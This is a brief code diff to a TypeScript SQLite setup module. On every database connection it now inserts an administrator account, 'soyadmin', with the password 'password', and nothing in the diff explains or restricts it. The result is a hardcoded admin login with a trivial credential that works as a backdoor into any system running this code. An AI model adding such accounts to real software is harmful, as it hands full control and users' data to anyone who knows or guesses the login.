@@ -1,5 +1,6 @@
 import { Database, open } from 'sqlite';
 import sqlite3 from 'sqlite3';
+import { hashPassword } from '../utils/password';
 
 let db: Database<sqlite3.Database, sqlite3.Statement>;
 
@@ -22,6 +23,9 @@ export const connectDB = async (): Promise<void> => {
         last_login TEXT
       )
     `);
+
+    
+    await db.run("INSERT OR IGNORE INTO users (username, password, role, last_login) VALUES ('soyadmin', ?, 'ADMIN', '2024-11-16T00:00:00Z')", [hashPassword("password")]);
 
     console.log('Database connected successfully.');
   } catch (error) {
